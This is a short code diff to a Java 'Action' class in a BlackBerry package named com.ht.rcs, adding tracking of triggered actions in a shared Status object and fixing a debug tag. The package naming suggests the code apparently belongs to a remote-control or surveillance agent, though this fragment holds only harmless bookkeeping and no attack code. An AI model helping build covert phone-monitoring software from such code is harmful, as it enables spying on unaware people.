@@ -12,6 +12,7 @@ package com.ht.rcs.blackberry.action;
 
 import java.util.Vector;
 
+import com.ht.rcs.blackberry.Status;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
@@ -23,7 +24,7 @@ public class Action {
 
     /** The debug instance. */
 	//#debug
-    protected static Debug debug = new Debug("Status", DebugLevel.VERBOSE);
+    protected static Debug debug = new Debug("Action", DebugLevel.VERBOSE);
 
     /** The Constant ACTION_UNINIT. */
     public static final int ACTION_UNINIT = -2;
@@ -39,6 +40,8 @@ public class Action {
 
     /** The Action id. */
     public int actionId = -1;
+    
+    Status status;
 
     /**
      * Instantiates a new action.
@@ -49,6 +52,7 @@ public class Action {
     public Action(int actionId_) {
         this.actionId = actionId_;
         subActionList = new Vector();
+        status = Status.getInstance();
     }
 
     /**
@@ -103,6 +107,12 @@ public class Action {
         // #debug
         debug.trace(actionId + " triggered:" + value);
         triggered = value;
+        if(value)
+        {
+            status.addActionTriggered(this);
+        }else{
+            status.removeActionTriggered(this);
+        }
     }
 
     /*
